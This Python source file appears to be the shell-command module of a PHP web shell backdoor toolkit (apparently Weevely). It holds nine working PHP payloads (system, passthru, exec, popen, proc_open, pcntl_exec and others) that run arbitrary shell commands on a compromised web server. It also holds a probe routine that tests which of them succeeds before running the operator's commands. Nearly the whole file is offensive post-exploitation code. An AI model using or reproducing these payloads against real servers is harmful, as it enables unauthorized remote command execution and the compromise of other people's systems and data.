'''
Created on 22/ago/2011

@author: norby
'''
from core.moduleexception import ModuleException, ProbeException, ExecutionException, ProbeSucceed
from core.moduleguess import ModuleGuess
from core.argparse import ArgumentParser, StoredNamespace
from core.argparse import SUPPRESS
from ast import literal_eval
import random

MSG_SH_INTERPRETER_SUCCEED = 'Shell interpreter load succeed'
WARN_SH_INTERPRETER_FAIL = 'Shell interpreters load failed'

class Sh(ModuleGuess):
    '''Execute system shell command'''

    def _set_vectors(self):
        self.vectors.add_vector("system", 'shell.php', "@system('$cmd $no_stderr');")
        self.vectors.add_vector("passthru" , 'shell.php', "@passthru('$cmd $no_stderr');")
        self.vectors.add_vector("shell_exec", 'shell.php', "print(@shell_exec('$cmd $no_stderr'));")
        self.vectors.add_vector("exec", 'shell.php',  "$r=array(); @exec('$cmd $no_stderr', $r);print(join(\"\\n\",$r));")
        self.vectors.add_vector("pcntl", 'shell.php', '$p=@pcntl_fork(); if(!$p) { { @pcntl_exec( "/bin/sh", Array("-c", "$cmd")); } else { @pcntl_waitpid($p,$status); }}'),
        self.vectors.add_vector("popen", 'shell.php', "$h = @popen('$cmd','r'); if($h) { while(!feof($h)) echo(fread($h,4096)); pclose($h); }")
        self.vectors.add_vector("python_eval", 'shell.php', "@python_eval('import os; os.system('$cmd$no_stderr');');")
        self.vectors.add_vector("perl_system", 'shell.php', "if(class_exists('Perl')) { $perl = new Perl(); $r = $perl->system('$cmd$no_stderr'); print($r); }")
        self.vectors.add_vector("proc_open", 'shell.php', """$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));
$h = @proc_open('$cmd', $p, $pipes); if($h&&$pipes) { while(!feof($pipes[1])) echo(fread($pipes[1],4096));
while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);
fclose($pipes[2]); proc_close($h); }""")
     
    def _set_args(self):
        self.argparser.add_argument('cmd', help='Shell command', nargs='+')
        self.argparser.add_argument('-no-stderr', help='Suppress error output', action='store_false')
        self.argparser.add_argument('-vector', choices = self.vectors.keys())
        
    def _init_stored_args(self):
        self.stored_args_namespace = StoredNamespace()
        self.stored_args_namespace['vector'] = None 

    def _execute_vector(self):
        
        # Cases: 
        # 1. First call by terminal. No preset vector, do a slacky probe
        # 2. first call by cmdline (no vector)
        if not self.stored_args_namespace['vector']:
            if self.__slacky_probe():
                self.stored_args_namespace['vector'] = self.current_vector.name
                
                # If there is no command, raise ProbeSucceed and do not execute the command
                if self.args['cmd'] == [' ']:
                    raise ProbeSucceed(self.name, MSG_SH_INTERPRETER_SUCCEED)
         
        # Execute if is current vector is saved or choosen
        if self.args['cmd'][0] != ' ' and self.current_vector.name in (self.stored_args_namespace['vector'], self.args['vector']):
            self._result = self.current_vector.execute( self.formatted_args)
            
        
    def _prepare_vector(self):
        
        # Format cmd
        self.formatted_args['cmd'] = ' '.join(self.args['cmd']).replace( "'", "\\'" )

        # Format stderr
        if any('$no_stderr' in p for p in self.current_vector.payloads):
            if self.args['no_stderr']:
                self.formatted_args['no_stderr'] = '2>&1'
            else:
                self.formatted_args['no_stderr'] = ''
 
    def __slacky_probe(self):
        
        rand = str(random.randint( 11111, 99999 ))
        
        slacky_formats = self.formatted_args.copy()
        slacky_formats['cmd'] = 'echo %s' % (rand)
        
        if self.current_vector.execute(slacky_formats) == rand:
            return True
        





